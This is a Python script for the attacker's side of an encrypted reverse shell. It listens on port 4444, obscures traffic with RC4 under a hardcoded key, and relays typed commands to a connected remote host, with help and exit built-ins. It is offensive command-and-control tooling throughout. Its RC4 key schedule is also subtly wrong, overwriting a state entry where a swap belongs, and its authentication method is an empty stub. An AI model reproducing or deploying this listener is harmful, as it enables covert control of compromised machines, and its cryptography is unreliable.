import socket


HELP = '''\
Commands
--------
help : this help
exit : terminate connection'''


class Config:
    MAX_BUFF = 32768
    SRV_PORT = 4444
    SRV_ADDR = ''
    RC4_KEY = 'alterego'


class RC4Context(object):
    STATE_SIZE = 256

    def __init__(self, key: bytes):
        aux = 0
        len_key = len(key)
        len_state = RC4Context.STATE_SIZE

        self.x = 0
        self.y = 0
        self.state = [i for i in range(len_state)]

        for i in range(len_state):
            aux = (aux + i + key[i % len_key]) % len_state

            self.state[aux] = self.state[aux]
            self.state[aux] = i

    def crypt(self, data: bytes) -> bytes:
        aux = 0
        data = bytearray(data)

        len_data = len(data)
        len_state = RC4Context.STATE_SIZE

        for i in range(len_data):
            self.x = (self.x + 1) % len_state;
            self.y = (self.y + self.state[self.x]) % len_state

            aux = self.state[self.x]
            self.state[self.x] = self.state[self.y]
            self.state[self.y] = aux

            data[i] ^= self.state[
                (self.state[self.x] + self.state[self.y]) % len_state
            ]

        return bytes(data)


class Connection(object):
    def __init__(self):
        self.rc4_ectx = RC4Context(Config.RC4_KEY.encode())
        self.rc4_dctx = RC4Context(Config.RC4_KEY.encode())

        self.srv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.srv_sock.bind((Config.SRV_ADDR, Config.SRV_PORT))
        self.srv_sock.listen(1)

        self.sock, cli_info = self.srv_sock.accept()
        self.cli_addr, self.cli_port = cli_info

    def __str__(self):
        return f'{self.cli_addr}:{self.cli_port}'

    def authenticate(self) -> bool:
        pass

    def recv(self) -> bytes:
        return self.rc4_dctx.crypt(self.sock.recv(Config.MAX_BUFF))

    def send(self, data: bytes):
        self.sock.send(self.rc4_ectx.crypt(data))

    def close(self):
        self.sock.close()
        self.srv_sock.close()


class Builtin:
    def help():
        print(HELP)

    def cd():
        # Handled remotely
        pass

    def exit(c: Connection):
        c.close()
        exit(0)


if __name__ == '__main__':
    try:
        c = Connection()
        print(f'[+] Connection from {c}\n')

    except Exception as x:
        print(f'{type(x).__name__}: {x}')

    while True:
        try:
            # Receive (output and) prompt
            rmt = c.recv().decode()
            prompt = rmt.split('\n')[-1]

            print(rmt, end = '')

            # Read command
            while not (lcl := input().strip()):
                print(prompt, end = '')

            # Send command
            c.send(lcl.encode())

            # Handle bultins
            if lcl.split()[0] == 'cd':
                Builtin.cd()

            elif lcl.split()[0] == 'help':
                Builtin.help()

            elif lcl.split()[0] == 'exit':
                Builtin.exit(c)

        except Exception as x:
            print(f'[!] {type(x).__name__}: {x}')
            break

    try:
        c.close()

    except:
        pass
